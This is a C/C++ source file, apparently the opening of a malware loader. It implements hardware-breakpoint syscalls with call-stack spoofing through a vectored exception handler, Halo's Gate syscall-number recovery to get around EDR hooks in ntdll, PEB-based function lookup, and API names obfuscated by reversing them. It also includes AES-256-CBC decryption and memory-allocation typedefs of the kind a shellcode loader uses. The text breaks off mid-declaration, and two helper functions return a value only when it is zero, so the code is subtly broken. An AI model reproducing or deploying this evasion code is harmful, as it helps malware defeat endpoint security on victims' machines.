#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <iostream>
#include <windows.h>
#include <inttypes.h>
#include <fstream>

#pragma region Defines

#define HWSYSCALLS_DEBUG 0 // 0 disable, 1 enable
#define UP -32
#define DOWN 32
#define STACK_ARGS_LENGTH 8
#define STACK_ARGS_RSP_OFFSET 0x28
#define X64_PEB_OFFSET 0x60

#pragma endregion

#pragma region Macros

#if HWSYSCALLS_DEBUG == 0
#define DEBUG_PRINT( STR, ... )
#else
#define DEBUG_PRINT( STR, ... ) printf(STR, __VA_ARGS__ ); 
#endif

#pragma endregion

#pragma region Type Defintions

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _RTL_USER_PROCESS_PARAMETERS {
    BYTE           Reserved1[16];
    PVOID          Reserved2[10];
    UNICODE_STRING ImagePathName;
    UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

typedef struct _PEB_LDR_DATA {
    BYTE       Reserved1[8];
    PVOID      Reserved2[3];
    LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _LDR_DATA_TABLE_ENTRY {
    PVOID Reserved1[2];
    LIST_ENTRY InMemoryOrderLinks;
    PVOID Reserved2[2];
    PVOID DllBase;
    PVOID EntryPoint;
    PVOID Reserved3;
    UNICODE_STRING FullDllName;
    BYTE Reserved4[8];
    PVOID Reserved5[3];
    union {
        ULONG CheckSum;
        PVOID Reserved6;
    };
    ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[21];
    PPEB_LDR_DATA LoaderData;
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
    BYTE Reserved3[520];
    PVOID PostProcessInitRoutine;
    BYTE Reserved4[136];
    ULONG SessionId;
} PEB, * PPEB;

typedef BOOL(WINAPI* GetThreadContext_t)(
    _In_ HANDLE hThread,
    _Inout_ LPCONTEXT lpContext
    );

typedef BOOL(WINAPI* SetThreadContext_t)(
    _In_ HANDLE hThread,
    _In_ CONST CONTEXT* lpContext
    );

#pragma endregion

#pragma region Function Declerations

BOOL MaskCompare(const BYTE* pData, const BYTE* bMask, const char* szMask);
DWORD_PTR FindPattern(DWORD_PTR dwAddress, DWORD dwLen, PBYTE bMask, PCHAR szMask);
DWORD_PTR FindInModule(LPCSTR moduleName, PBYTE bMask, PCHAR szMask);
UINT64 GetModuleAddress(LPWSTR sModuleName);
UINT64 GetSymbolAddress(UINT64 moduleBase, const char* functionName);
UINT64 PrepareSyscall(char* functionName);
bool SetMainBreakpoint();
DWORD64 FindSyscallNumber(DWORD64 functionAddress);
DWORD64 FindSyscallReturnAddress(DWORD64 functionAddress, WORD syscallNumber);
LONG HWSyscallExceptionHandler(EXCEPTION_POINTERS* ExceptionInfo);
bool InitHWSyscalls();
bool DeinitHWSyscalls();

#pragma endregion

#pragma region GlobalVariables

PVOID exceptionHandlerHandle;
HANDLE myThread;
HANDLE hNtdll;
UINT64 ntFunctionAddress;
UINT64 k32FunctionAddress;
UINT64 retGadgetAddress;
UINT64 stackArgs[STACK_ARGS_LENGTH];
UINT64 callRegGadgetAddress;
UINT64 callRegGadgetAddressRet;
char callRegGadgetValue;
UINT64 regBackup;

#pragma endregion

#pragma region BinaryPatternMatching

#define SIZEOF(x) sizeof(x) - 1


char kernelbase[] = "lld.esablenrek";
char getContext[] = "txetnoCdaerhTteG";
char setContext[] = "txetnoCdaerhTteS";

void reverseStr2(char* str, int nSize)
{

    // Swap character starting from two
    // corners
    for (int i = 0; i < nSize / 2; i++)
        std::swap(str[i], str[nSize - i - 1]);
    return;
}

BOOL MaskCompare(const BYTE* pData, const BYTE* bMask, const char* szMask)
{
    for (; *szMask; ++szMask, ++pData, ++bMask)
        if (*szMask == 'x' && *pData != *bMask)
            return FALSE;
    return TRUE;
}

DWORD_PTR FindPattern(DWORD_PTR dwAddress, DWORD dwLen, PBYTE bMask, PCHAR szMask)
{
    for (DWORD i = 0; i < dwLen; i++)
        if (MaskCompare((PBYTE)(dwAddress + i), bMask, szMask))
            return (DWORD_PTR)(dwAddress + i);

    return 0;
}

DWORD_PTR FindInModule(LPCSTR moduleName, PBYTE bMask, PCHAR szMask)
{
    DWORD_PTR dwAddress = 0;
    PIMAGE_DOS_HEADER imageBase = (PIMAGE_DOS_HEADER)GetModuleHandleA(moduleName);

    if (!imageBase)
        return 0;

    DWORD_PTR sectionOffset = (DWORD_PTR)imageBase + imageBase->e_lfanew + sizeof(IMAGE_NT_HEADERS);

    if (!sectionOffset)
        return 0;

    PIMAGE_SECTION_HEADER textSection = (PIMAGE_SECTION_HEADER)(sectionOffset);
    dwAddress = FindPattern((DWORD_PTR)imageBase + textSection->VirtualAddress, textSection->SizeOfRawData, bMask, szMask);
    return dwAddress;
}

#pragma endregion

#pragma region PEBGetProcAddress

UINT64 GetModuleAddress(LPWSTR moduleName) {
    PPEB peb = (PPEB)__readgsqword(X64_PEB_OFFSET);
    LIST_ENTRY* ModuleList = NULL;

    if (!moduleName)
        return 0;

    for (LIST_ENTRY* pListEntry = peb->LoaderData->InMemoryOrderModuleList.Flink;
        pListEntry != &peb->LoaderData->InMemoryOrderModuleList;
        pListEntry = pListEntry->Flink) {

        PLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

        if (wcsstr(pEntry->FullDllName.Buffer, moduleName)) {
            return (UINT64)pEntry->DllBase;
        }
    }
    return 0;
}

UINT64 GetSymbolAddress(UINT64 moduleBase, const char* functionName) {
    UINT64 functionAddress = 0;
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;

    // Checking that the image is valid PE file.
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return 0;
    }

    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(moduleBase + dosHeader->e_lfanew);

    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return functionAddress;
    }

    IMAGE_OPTIONAL_HEADER optionalHeader = ntHeaders->OptionalHeader;

    if (optionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == 0) {
        return functionAddress;
    }

    // Iterating the export directory.
    PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)(moduleBase + optionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* addresses = (DWORD*)(moduleBase + exportDirectory->AddressOfFunctions);
    WORD* ordinals = (WORD*)(moduleBase + exportDirectory->AddressOfNameOrdinals);
    DWORD* names = (DWORD*)(moduleBase + exportDirectory->AddressOfNames);

    for (DWORD j = 0; j < exportDirectory->NumberOfNames; j++) {
        if (_stricmp((char*)(moduleBase + names[j]), functionName) == 0) {
            functionAddress = moduleBase + addresses[ordinals[j]];
            break;
        }
    }

    return functionAddress;
}

#pragma endregion

#pragma region HalosGate

DWORD64 FindSyscallNumber(DWORD64 functionAddress) {
    WORD syscallNumber = 0;

    for (WORD idx = 1; idx <= 500; idx++) {
        // check neighboring syscall down
        if (*((PBYTE)functionAddress + idx * DOWN) == 0x4c
            && *((PBYTE)functionAddress + 1 + idx * DOWN) == 0x8b
            && *((PBYTE)functionAddress + 2 + idx * DOWN) == 0xd1
            && *((PBYTE)functionAddress + 3 + idx * DOWN) == 0xb8
            && *((PBYTE)functionAddress + 6 + idx * DOWN) == 0x00
            && *((PBYTE)functionAddress + 7 + idx * DOWN) == 0x00) {
            BYTE high = *((PBYTE)functionAddress + 5 + idx * DOWN);
            BYTE low = *((PBYTE)functionAddress + 4 + idx * DOWN);

            syscallNumber = (high << 8) | low - idx;
            break;
        }

        // check neighboring syscall up
        if (*((PBYTE)functionAddress + idx * UP) == 0x4c
            && *((PBYTE)functionAddress + 1 + idx * UP) == 0x8b
            && *((PBYTE)functionAddress + 2 + idx * UP) == 0xd1
            && *((PBYTE)functionAddress + 3 + idx * UP) == 0xb8
            && *((PBYTE)functionAddress + 6 + idx * UP) == 0x00
            && *((PBYTE)functionAddress + 7 + idx * UP) == 0x00) {
            BYTE high = *((PBYTE)functionAddress + 5 + idx * UP);
            BYTE low = *((PBYTE)functionAddress + 4 + idx * UP);

            syscallNumber = (high << 8) | low + idx;
            break;
        }

    }

    if (syscallNumber == 0)

        return syscallNumber;
}

DWORD64 FindSyscallReturnAddress(DWORD64 functionAddress, WORD syscallNumber) {
    // @sektor7 - RED TEAM Operator: Windows Evasion course - https://blog.sektor7.net/#!res/2021/halosgate.md
    DWORD64 syscallReturnAddress = 0;

    for (WORD idx = 1; idx <= 32; idx++) {
        if (*((PBYTE)functionAddress + idx) == 0x0f && *((PBYTE)functionAddress + idx + 1) == 0x05) {
            syscallReturnAddress = (DWORD64)((PBYTE)functionAddress + idx);
            break;
        }
    }

    if (syscallReturnAddress == 0)

        return syscallReturnAddress;
}

#pragma endregion

UINT64 PrepareSyscall(char* functionName) {
    return ntFunctionAddress;
}

bool SetMainBreakpoint() {
    // Dynamically find the GetThreadContext and SetThreadContext functions
    reverseStr2(getContext, SIZEOF(getContext));
    GetThreadContext_t pGetThreadContext = (GetThreadContext_t)GetSymbolAddress(GetModuleAddress((LPWSTR)L"KERN"), getContext);
    reverseStr2(setContext, SIZEOF(setContext));
    SetThreadContext_t pSetThreadContext = (SetThreadContext_t)GetSymbolAddress(GetModuleAddress((LPWSTR)L"KERN"), setContext);

    DWORD old = 0;

    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    // Get current thread context
    pGetThreadContext(myThread, &ctx);

    // Set hardware breakpoint on PrepareSyscall function
    ctx.Dr0 = (UINT64)&PrepareSyscall;
    ctx.Dr7 |= (1 << 0);
    ctx.Dr7 &= ~(1 << 16);
    ctx.Dr7 &= ~(1 << 17);
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    // Apply the modified context to the current thread
    if (!pSetThreadContext(myThread, &ctx)) {
        return false;
    }

    return true;
}

LONG HWSyscallExceptionHandler(EXCEPTION_POINTERS* ExceptionInfo) {
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        if (ExceptionInfo->ContextRecord->Rip == (DWORD64)&PrepareSyscall) {

            // Find the address of the syscall function in ntdll we got as the first argument of the PrepareSyscall function
            ntFunctionAddress = GetSymbolAddress((UINT64)hNtdll, (const char*)(ExceptionInfo->ContextRecord->Rcx));

            // Move breakpoint to the NTAPI function;
            ExceptionInfo->ContextRecord->Dr0 = ntFunctionAddress;
        }
        else if (ExceptionInfo->ContextRecord->Rip == (DWORD64)ntFunctionAddress) {

            // Create a new stack to spoof the kernel32 function address
            // The stack size will be 0x70 which is compatible with the RET_GADGET we found.
            // sub rsp, 70
            ExceptionInfo->ContextRecord->Rsp -= 0x70;
            // mov rsp, REG_GADGET_ADDRESS
            *(PULONG64)(ExceptionInfo->ContextRecord->Rsp) = retGadgetAddress;

            // Copy the stack arguments from the original stack
            for (size_t idx = 0; idx < STACK_ARGS_LENGTH; idx++)
            {
                const size_t offset = idx * STACK_ARGS_LENGTH + STACK_ARGS_RSP_OFFSET;
                *(PULONG64)(ExceptionInfo->ContextRecord->Rsp + offset) = *(PULONG64)(ExceptionInfo->ContextRecord->Rsp + offset + 0x70);
            }

            DWORD64 pFunctionAddress = ExceptionInfo->ContextRecord->Rip;

            char nonHookedSyscallBytes[] = { 0x4C,0x8B,0xD1,0xB8 };
            if (FindPattern(pFunctionAddress, 4, (PBYTE)nonHookedSyscallBytes, (PCHAR)"xxxx")) {
            }
            else {


                WORD syscallNumber = FindSyscallNumber(pFunctionAddress);

                if (syscallNumber == 0) {
                    ExceptionInfo->ContextRecord->Dr0 = callRegGadgetAddressRet;
                    return EXCEPTION_CONTINUE_EXECUTION;
                }

                DWORD64 syscallReturnAddress = FindSyscallReturnAddress(pFunctionAddress, syscallNumber);

                if (syscallReturnAddress == 0) {
                    ExceptionInfo->ContextRecord->Dr0 = callRegGadgetAddressRet;
                    return EXCEPTION_CONTINUE_EXECUTION;
                }

                // mov r10, rcx
                ExceptionInfo->ContextRecord->R10 = ExceptionInfo->ContextRecord->Rcx;
                //mov eax, SSN
                ExceptionInfo->ContextRecord->Rax = syscallNumber;
                //Set RIP to syscall;ret; opcode address
                ExceptionInfo->ContextRecord->Rip = syscallReturnAddress;

            }

            // Move breakpoint back to PrepareSyscall to catch the next invoke
            ExceptionInfo->ContextRecord->Dr0 = (UINT64)&PrepareSyscall;


        }
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

bool FindRetGadget() {
    // Dynamically search for a suitable "ADD RSP,68;RET" gadget in both kernel32 and kernelbase
    retGadgetAddress = FindInModule("kernel32.dll", (PBYTE)"\x48\x83\xC4\x68\xC3", (PCHAR)"xxxxx");
    if (retGadgetAddress != 0) {
        return true;
    }
    else {
        reverseStr2(kernelbase, SIZEOF(kernelbase));
        retGadgetAddress = FindInModule(kernelbase, (PBYTE)"\x48\x83\xC4\x68\xC3", (PCHAR)"xxxxx");
        if (retGadgetAddress != 0) {
            return true;
        }
    }
    return false;
}

bool InitHWSyscalls() {
    myThread = GetCurrentThread();
    hNtdll = (HANDLE)GetModuleAddress((LPWSTR)L"ntd");

    if (!FindRetGadget()) {
        return false;
    }

    // Register exception handler
    exceptionHandlerHandle = AddVectoredExceptionHandler(1, &HWSyscallExceptionHandler);

    if (!exceptionHandlerHandle) {
        return false;
    }

    return SetMainBreakpoint();
}

bool DeinitHWSyscalls() {
    return RemoveVectoredExceptionHandler(exceptionHandlerHandle) != 0;
}

#define Nb 4
#define Nk 8
#define Nr 14
#ifndef MULTIPLY_AS_A_FUNCTION
#define MULTIPLY_AS_A_FUNCTION 0
#endif
#define AES_BLOCKLEN 16
#define AES_KEYLEN 32
#define AES_keyExpSize 240
struct AES_ctx
{
	unsigned char RoundKey[AES_keyExpSize];
	unsigned char Iv[AES_BLOCKLEN];
};
typedef unsigned char state_t[4][4];
static const unsigned char sbox[256] = {
	//0     1    2      3     4    5     6     7      8    9     A      B    C     D     E     F
	0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
	0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
	0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
	0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
	0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
	0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
	0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
	0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
	0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
	0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
	0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
	0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
	0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
	0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
	0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
	0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16 };
static const unsigned char rsbox[256] = {
  0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38, 0xbf, 0x40, 0xa3, 0x9e, 0x81, 0xf3, 0xd7, 0xfb,
  0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87, 0x34, 0x8e, 0x43, 0x44, 0xc4, 0xde, 0xe9, 0xcb,
  0x54, 0x7b, 0x94, 0x32, 0xa6, 0xc2, 0x23, 0x3d, 0xee, 0x4c, 0x95, 0x0b, 0x42, 0xfa, 0xc3, 0x4e,
  0x08, 0x2e, 0xa1, 0x66, 0x28, 0xd9, 0x24, 0xb2, 0x76, 0x5b, 0xa2, 0x49, 0x6d, 0x8b, 0xd1, 0x25,
  0x72, 0xf8, 0xf6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xd4, 0xa4, 0x5c, 0xcc, 0x5d, 0x65, 0xb6, 0x92,
  0x6c, 0x70, 0x48, 0x50, 0xfd, 0xed, 0xb9, 0xda, 0x5e, 0x15, 0x46, 0x57, 0xa7, 0x8d, 0x9d, 0x84,
  0x90, 0xd8, 0xab, 0x00, 0x8c, 0xbc, 0xd3, 0x0a, 0xf7, 0xe4, 0x58, 0x05, 0xb8, 0xb3, 0x45, 0x06,
  0xd0, 0x2c, 0x1e, 0x8f, 0xca, 0x3f, 0x0f, 0x02, 0xc1, 0xaf, 0xbd, 0x03, 0x01, 0x13, 0x8a, 0x6b,
  0x3a, 0x91, 0x11, 0x41, 0x4f, 0x67, 0xdc, 0xea, 0x97, 0xf2, 0xcf, 0xce, 0xf0, 0xb4, 0xe6, 0x73,
  0x96, 0xac, 0x74, 0x22, 0xe7, 0xad, 0x35, 0x85, 0xe2, 0xf9, 0x37, 0xe8, 0x1c, 0x75, 0xdf, 0x6e,
  0x47, 0xf1, 0x1a, 0x71, 0x1d, 0x29, 0xc5, 0x89, 0x6f, 0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe, 0x1b,
  0xfc, 0x56, 0x3e, 0x4b, 0xc6, 0xd2, 0x79, 0x20, 0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a, 0xf4,
  0x1f, 0xdd, 0xa8, 0x33, 0x88, 0x07, 0xc7, 0x31, 0xb1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xec, 0x5f,
  0x60, 0x51, 0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d, 0x2d, 0xe5, 0x7a, 0x9f, 0x93, 0xc9, 0x9c, 0xef,
  0xa0, 0xe0, 0x3b, 0x4d, 0xae, 0x2a, 0xf5, 0xb0, 0xc8, 0xeb, 0xbb, 0x3c, 0x83, 0x53, 0x99, 0x61,
  0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6, 0x26, 0xe1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0c, 0x7d };
static const unsigned char Rcon[11] = {
  0x8d, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36 };
#define getSBoxValue(num) (sbox[(num)])
#define getSBoxInvert(num) (rsbox[(num)])
static void KeyExpansion(unsigned char* RoundKey, const unsigned char* Key)
{
	unsigned i, j, k;
	unsigned char tempa[4];
	for (i = 0; i < Nk; ++i)
	{
		RoundKey[(i * 4) + 0] = Key[(i * 4) + 0];
		RoundKey[(i * 4) + 1] = Key[(i * 4) + 1];
		RoundKey[(i * 4) + 2] = Key[(i * 4) + 2];
		RoundKey[(i * 4) + 3] = Key[(i * 4) + 3];
	}
	for (i = Nk; i < Nb * (Nr + 1); ++i)
	{
		{
			k = (i - 1) * 4;
			tempa[0] = RoundKey[k + 0];
			tempa[1] = RoundKey[k + 1];
			tempa[2] = RoundKey[k + 2];
			tempa[3] = RoundKey[k + 3];
		}
		if (i % Nk == 0)
		{
			{
				const unsigned char u8tmp = tempa[0];
				tempa[0] = tempa[1];
				tempa[1] = tempa[2];
				tempa[2] = tempa[3];
				tempa[3] = u8tmp;
			}
			{
				tempa[0] = getSBoxValue(tempa[0]);
				tempa[1] = getSBoxValue(tempa[1]);
				tempa[2] = getSBoxValue(tempa[2]);
				tempa[3] = getSBoxValue(tempa[3]);
			}
			tempa[0] = tempa[0] ^ Rcon[i / Nk];
		}
		if (i % Nk == 4)
		{
			{
				tempa[0] = getSBoxValue(tempa[0]);
				tempa[1] = getSBoxValue(tempa[1]);
				tempa[2] = getSBoxValue(tempa[2]);
				tempa[3] = getSBoxValue(tempa[3]);
			}
		}
		j = i * 4; k = (i - Nk) * 4;
		RoundKey[j + 0] = RoundKey[k + 0] ^ tempa[0];
		RoundKey[j + 1] = RoundKey[k + 1] ^ tempa[1];
		RoundKey[j + 2] = RoundKey[k + 2] ^ tempa[2];
		RoundKey[j + 3] = RoundKey[k + 3] ^ tempa[3];
	}
}
void AES256CBC_init_ctx_iv(struct AES_ctx* ctx, const unsigned char* key, const unsigned char* iv)
{
	KeyExpansion(ctx->RoundKey, key);
	memcpy(ctx->Iv, iv, AES_BLOCKLEN);
}
static void AddRoundKey(unsigned char round, state_t* state, const unsigned char* RoundKey)
{
	unsigned char i, j;
	for (i = 0; i < 4; ++i)
	{
		for (j = 0; j < 4; ++j)
		{
			(*state)[i][j] ^= RoundKey[(round * Nb * 4) + (i * Nb) + j];
		}
	}
}
static void SubBytes(state_t* state)
{
	unsigned char i, j;
	for (i = 0; i < 4; ++i)
	{
		for (j = 0; j < 4; ++j)
		{
			(*state)[j][i] = getSBoxValue((*state)[j][i]);
		}
	}
}
static void ShiftRows(state_t* state)
{
	unsigned char temp;
	temp = (*state)[0][1];
	(*state)[0][1] = (*state)[1][1];
	(*state)[1][1] = (*state)[2][1];
	(*state)[2][1] = (*state)[3][1];
	(*state)[3][1] = temp;
	temp = (*state)[0][2];
	(*state)[0][2] = (*state)[2][2];
	(*state)[2][2] = temp;
	temp = (*state)[1][2];
	(*state)[1][2] = (*state)[3][2];
	(*state)[3][2] = temp;
	temp = (*state)[0][3];
	(*state)[0][3] = (*state)[3][3];
	(*state)[3][3] = (*state)[2][3];
	(*state)[2][3] = (*state)[1][3];
	(*state)[1][3] = temp;
}
static unsigned char xtime(unsigned char x)
{
	return ((x << 1) ^ (((x >> 7) & 1) * 0x1b));
}
static void MixColumns(state_t* state)
{
	unsigned char i;
	unsigned char Tmp, Tm, t;
	for (i = 0; i < 4; ++i)
	{
		t = (*state)[i][0];
		Tmp = (*state)[i][0] ^ (*state)[i][1] ^ (*state)[i][2] ^ (*state)[i][3];
		Tm = (*state)[i][0] ^ (*state)[i][1]; Tm = xtime(Tm);  (*state)[i][0] ^= Tm ^ Tmp;
		Tm = (*state)[i][1] ^ (*state)[i][2]; Tm = xtime(Tm);  (*state)[i][1] ^= Tm ^ Tmp;
		Tm = (*state)[i][2] ^ (*state)[i][3]; Tm = xtime(Tm);  (*state)[i][2] ^= Tm ^ Tmp;
		Tm = (*state)[i][3] ^ t;              Tm = xtime(Tm);  (*state)[i][3] ^= Tm ^ Tmp;
	}
}

#if MULTIPLY_AS_A_FUNCTION
static unsigned char Multiply(unsigned char x, unsigned char y)
{
	return (((y & 1) * x) ^
		((y >> 1 & 1) * xtime(x)) ^
		((y >> 2 & 1) * xtime(xtime(x))) ^
		((y >> 3 & 1) * xtime(xtime(xtime(x)))) ^
		((y >> 4 & 1) * xtime(xtime(xtime(xtime(x)))))); /* this last call to xtime() can be omitted */
}
#else
#define Multiply(x, y)                                \
	(  ((y & 1) * x) ^                              \
	((y>>1 & 1) * xtime(x)) ^                       \
	((y>>2 & 1) * xtime(xtime(x))) ^                \
	((y>>3 & 1) * xtime(xtime(xtime(x)))) ^         \
	((y>>4 & 1) * xtime(xtime(xtime(xtime(x))))))   \

#endif
static void InvMixColumns(state_t* state)
{
	int i;
	unsigned char a, b, c, d;
	for (i = 0; i < 4; ++i)
	{
		a = (*state)[i][0];
		b = (*state)[i][1];
		c = (*state)[i][2];
		d = (*state)[i][3];

		(*state)[i][0] = Multiply(a, 0x0e) ^ Multiply(b, 0x0b) ^ Multiply(c, 0x0d) ^ Multiply(d, 0x09);
		(*state)[i][1] = Multiply(a, 0x09) ^ Multiply(b, 0x0e) ^ Multiply(c, 0x0b) ^ Multiply(d, 0x0d);
		(*state)[i][2] = Multiply(a, 0x0d) ^ Multiply(b, 0x09) ^ Multiply(c, 0x0e) ^ Multiply(d, 0x0b);
		(*state)[i][3] = Multiply(a, 0x0b) ^ Multiply(b, 0x0d) ^ Multiply(c, 0x09) ^ Multiply(d, 0x0e);
	}
}
static void InvSubBytes(state_t* state)
{
	unsigned char i, j;
	for (i = 0; i < 4; ++i)
	{
		for (j = 0; j < 4; ++j)
		{
			(*state)[j][i] = getSBoxInvert((*state)[j][i]);
		}
	}
}
static void InvShiftRows(state_t* state)
{
	unsigned char temp;
	temp = (*state)[3][1];
	(*state)[3][1] = (*state)[2][1];
	(*state)[2][1] = (*state)[1][1];
	(*state)[1][1] = (*state)[0][1];
	(*state)[0][1] = temp;
	temp = (*state)[0][2];
	(*state)[0][2] = (*state)[2][2];
	(*state)[2][2] = temp;
	temp = (*state)[1][2];
	(*state)[1][2] = (*state)[3][2];
	(*state)[3][2] = temp;
	temp = (*state)[0][3];
	(*state)[0][3] = (*state)[1][3];
	(*state)[1][3] = (*state)[2][3];
	(*state)[2][3] = (*state)[3][3];
	(*state)[3][3] = temp;
}
static void Cipher(state_t* state, const unsigned char* RoundKey)
{
	unsigned char round = 0;
	AddRoundKey(0, state, RoundKey);
	for (round = 1; round < Nr; ++round)
	{
		SubBytes(state);
		ShiftRows(state);
		MixColumns(state);
		AddRoundKey(round, state, RoundKey);
	}
	SubBytes(state);
	ShiftRows(state);
	AddRoundKey(Nr, state, RoundKey);
}
static void InvCipher(state_t* state, const unsigned char* RoundKey)
{
	unsigned char round = 0;
	AddRoundKey(Nr, state, RoundKey);
	for (round = (Nr - 1); round > 0; --round)
	{
		InvShiftRows(state);
		InvSubBytes(state);
		AddRoundKey(round, state, RoundKey);
		InvMixColumns(state);
	}
	InvShiftRows(state);
	InvSubBytes(state);
	AddRoundKey(0, state, RoundKey);
}
static void XorWithIv(unsigned char* buf, const unsigned char* Iv)
{
	unsigned char i;
	for (i = 0; i < AES_BLOCKLEN; ++i)
	{
		buf[i] ^= Iv[i];
	}
}
void AES256CBC_encrypt(struct AES_ctx* ctx, unsigned char* buf, unsigned  int length)
{
	unsigned  int i;
	unsigned char* Iv = ctx->Iv;
	for (i = 0; i < length; i += AES_BLOCKLEN)
	{
		XorWithIv(buf, Iv);
		Cipher((state_t*)buf, ctx->RoundKey);
		Iv = buf;
		buf += AES_BLOCKLEN;
	}
	memcpy(ctx->Iv, Iv, AES_BLOCKLEN);
}
void AES256CBC_decrypt(struct AES_ctx* ctx, unsigned char* buf, unsigned  int length)
{
	unsigned  int i;
	unsigned char storeNextIv[AES_BLOCKLEN];
	for (i = 0; i < length; i += AES_BLOCKLEN)
	{
		memcpy(storeNextIv, buf, AES_BLOCKLEN);
		InvCipher((state_t*)buf, ctx->RoundKey);
		XorWithIv(buf, ctx->Iv);
		memcpy(ctx->Iv, storeNextIv, AES_BLOCKLEN);
		buf += AES_BLOCKLEN;
	}
}
#define KEY 0xb6
#define SIZEOF(x) sizeof(x) - 1

typedef struct _OBJECT_ATTRIBUTES
{
	ULONG           Length;
	HANDLE          RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG           Attributes;
	PVOID           SecurityDescriptor;
	PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;




typedef NTSTATUS(NTAPI* NtAllocateVirtualMemory_t)(
	HANDLE             ProcessHandle,
	PVOID* BaseAddress,
	ULONG              ZeroBits,
	PULONG             RegionSize,
	ULONG              AllocationType,
	ULONG              Protect
	);

typedef NTSTATUS(NTAPI* NtProtectVirtualMemory_t)(
	IN HANDLE               ProcessHandle,
	IN OUT PVOID* BaseAddress,
	IN OUT PULONG           NumberOfBytesToProtect,
	IN ULONG                NewAccessProtection,
	OUT PULONG              OldAccessProtection
	);

typedef struct _IO_STATUS_BLOCK {
	union {
		NTSTATUS Status;
		PVOID    Pointer;
	};
	ULONG_PTR Information;
} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;

typedef VOID(NTAPI* PIO_APC_ROUTINE)(
	IN PVOID ApcContext,
	IN PIO_STATUS_BLOCK IoStatusBlock,
